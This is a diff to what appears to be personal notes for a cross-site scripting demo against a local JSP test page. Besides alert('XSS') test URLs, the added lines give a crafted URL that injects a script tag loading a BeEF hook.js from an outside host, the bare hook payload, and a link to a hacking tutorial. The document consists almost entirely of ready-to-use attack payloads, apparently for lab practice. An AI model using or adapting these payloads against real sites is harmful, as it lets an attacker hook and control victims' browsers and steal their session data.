@@ -2,3 +2,17 @@
 http://localhost:8080/demoxss/xsstest.jsp?input=hello
 http://localhost:8080/demoxss/xsstest.jsp?input=<script>alert('XSS');</script>
 http://localhost:8080/demoxss/xsstest.jsp?input=%3Cscript%3Ealert(%27XSS%27);%3C/script%3E
+
+
+Hook URL:  
+
+http://localhost:8080/demoxss/xsstest.jsp?input=<script type=text/javascript src=http://172.16.92.133:3000/hook.js></script>&x=0&y=0
+
+Beef Payload:  
+
+http://172.16.92.133:3000/hook.js
+
+<script type=text/javascript src=http://172.16.92.133:3000/hook.js></script>&x=0&y=0
+
+REF:  http://www.hacking-tutorial.com/hacking-tutorial/xss-attack-hacking-using-beef-xss-framework/#sthash.p5WulMoY.2JPrbKEY.dpbs
+
